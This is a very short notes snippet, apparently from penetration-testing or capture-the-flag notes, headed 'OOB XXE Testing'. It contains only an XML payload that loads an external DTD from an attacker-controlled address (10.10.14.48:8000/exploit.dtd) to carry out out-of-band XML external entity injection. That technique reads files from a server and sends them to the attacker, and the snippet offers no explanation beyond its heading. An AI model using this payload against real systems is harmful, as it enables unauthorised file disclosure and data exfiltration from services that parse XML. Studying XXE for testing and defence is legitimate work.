### OOB XXE Testing

```
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE svg [ 
  <!ENTITY % remote SYSTEM "http://10.10.14.48:8000/exploit.dtd"> 
  %remote; 
  %content; 
]> 
<root>&content;</root>
```
